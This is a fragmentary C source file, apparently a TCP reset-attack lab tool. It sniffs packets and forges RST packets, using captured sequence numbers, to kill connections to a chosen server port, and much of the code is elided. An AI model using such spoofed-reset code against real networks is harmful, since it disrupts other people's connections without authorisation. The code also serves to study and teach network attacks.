//To run: gcc TCPRest.c && sudo ./a.out
...
//give params
// void sendRST(uint16_t sIP, uint16_t dIP, uint16_t sPort, uint16_t dPort, uint32_t sqNum, uint32_t ackNum)
void sendRST(uint16_t sPort, uint16_t dPort, uint32_t sqNum, uint32_t ackNum)
{
  ...
  //Setup
  // unsigned short *srcIP = sIP; //"12.10.10";
  // unsigned short *dstIP = dIP; //"10.13.56.25";
  // int dstPort = dPort; //39841;
  // int srcPort = sPort; //30001;

  // char *srcIP = sIP; //"12.10.10";
  // char *dstIP = dIP; //"10.13.56.25";
  ...
  tcpHdr->seq = ntohl(sqNum);//0x0; //32 bit sequence number, initially set to zero
  tcpHdr->ack_seq = ntohl(ackNum);//0x0; //32 bit ack sequence number, depends whether ACK is set or not
...
int print_ip_header(unsigned char* Buffer, int Size)
{
	...
	sourceTrack.sin_addr.s_addr = iph->saddr;

	memset(&destTrack, 0, sizeof(destTrack));
	destTrack.sin_addr.s_addr = iph->daddr;

	// if(source.sin_addr.s_addr == inet_addr(IP_OF_SERVER) || dest.sin_addr.s_addr == inet_addr(IP_OF_SERVER))
...
void print_tcp_packet(unsigned char* Buffer, int Size)
{
	...
	if ((unsigned int)tcph->ack)
	{
		//if((unsigned int)tcph->syn)
		{
			...
			//send RST packet
			// if(print_ip_header(Buffer,Size) && (tcph->source == ntohs(PORT_OF_SERVER) || tcph->dest == ntohs(PORT_OF_SERVER)))
			if(print_ip_header(Buffer,Size) && tcph->dest == ntohs(PORT_OF_SERVER))
			{
				printf("SENDING RST\n");
				sendRST(tcph->source, tcph->dest, tcph->seq, tcph->ack_seq);
			}
		}
	}
